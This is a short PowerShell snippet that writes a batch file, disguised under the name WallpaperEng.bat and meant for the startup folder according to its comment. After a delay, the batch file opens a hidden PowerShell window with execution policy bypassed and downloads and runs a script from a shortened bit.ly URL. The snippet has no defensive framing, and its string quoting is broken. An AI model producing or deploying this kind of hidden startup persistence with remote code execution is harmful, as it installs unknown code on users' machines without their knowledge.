#Creates a .bat file in the startup folder via ps that runs ps script hosted online

$batContent = "@echo off
timeout /t 90
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm bit.ly/kill-wallpaper | iex"

Set-Content -Path WallpaperEng.bat -Value $batContent -Encoding ASCII
